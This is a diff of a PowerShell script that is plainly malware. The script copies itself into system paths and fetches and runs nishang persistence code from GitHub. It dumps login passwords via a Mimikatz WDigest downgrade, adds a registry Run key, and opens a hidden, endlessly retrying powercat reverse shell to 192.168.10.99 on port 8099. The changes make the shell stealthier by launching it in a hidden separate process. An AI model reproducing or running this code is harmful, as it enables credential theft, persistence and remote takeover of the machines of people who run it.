@@ -2,7 +2,7 @@
 $Env:path=$Env:Path+";C:\Windows\System32\WindowsPowerShell\v1.0\"  
 
 # copy self to temp path
-cp $MyInvocation.MyCommand.Path $env:temp\fdisk.ps1
+cp $MyInvocation.MyCommand.Path "$env:temp\fdisk.ps1"
 
 # copy self to powershell root path
 cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
@@ -18,11 +18,11 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
 	Add-Persistence -ScriptPath $MyInvocation.MyCommand.Path
 
-	# auto-run
-	New-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run -Name fdisk -PropertyType String -Value "powershell echo"
+	# auto-run TODO
+	New-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run -Name Sysprep -PropertyType String -Value "C:\Windows\System32\Sysprep\sysprep.exe"
 
 	# dump login user password
-	$strFileName="c:\windows\z_account.log"
+	$strFileName="c:\windows\zaccount.log"
 	If (Test-Path $strFileName){
 		# // File exists
 	
@@ -30,24 +30,27 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 		# // File does not exist
 		IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
 		Invoke-MimikatzWDigestDowngrade
-		Get-Job | Receive-Job | Out-File c:\windows\zacount.log
+		Get-Job | Receive-Job | Out-File $strFileName
 	}
 
-
+	
 	# shell reverse
-	While(1){
-		Try {
-			start-job {
-				IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
-				Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
+	start-process -WindowStyle Hidden powershell @"
+		While(1){
+			Try {
+				start-job {
+					IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+					powercat -c 192.168.10.99 -p 8099 -ep
+				}
+				get-job | wait-job
 			}
-			get-job | wait-job
+			Catch {
+			}
+			Start-Sleep -Seconds 3
 		}
-		Catch {
-			Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
-		}
-		Start-Sleep -Seconds 3
-	}
+"@
+	
+	
 	
 } else {
 	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
